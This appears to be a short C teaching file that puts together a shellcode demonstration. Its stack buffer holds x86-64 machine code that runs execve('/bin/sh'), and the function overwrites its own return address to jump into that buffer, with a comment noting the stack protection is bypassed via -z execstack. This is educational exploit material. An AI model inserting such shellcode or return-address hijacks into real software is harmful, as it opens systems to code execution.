/*
Now, putting it all together:

We have taken the byte code that we got from the disassembly of shellcode_asm.c,
and stuck it in a char array allocated on the stack.

We have added the string "/bin/sh" immediately after the call instruction,
we have also padded the array with trailing zeroes, which is the area in which
we will end up storing the arguments to execve.

Normally data in the stack is non-executable, we bypass this by compiling with
the `-z execstack` option.
*/

void foo(void) {
    int i;
    char buf[69] =
        "\xeb\x1f\x5d\x48\x89\x6d\x08\x31\xc0\x89\x45\x10\x89\xc2\xb0\x3b\x48\x8d"
        "\x75\x08\x48\x8b\x7d\x08\x0f\x05\x48\x31\xff\xb0\x3c\x0f\x05\xe8\xdc\xff"
        "\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68";
    long *ret = (long *)((char *)&i + 20);
    *ret = (long)buf;
}

int main(void) {
    foo();
    return 0;
}
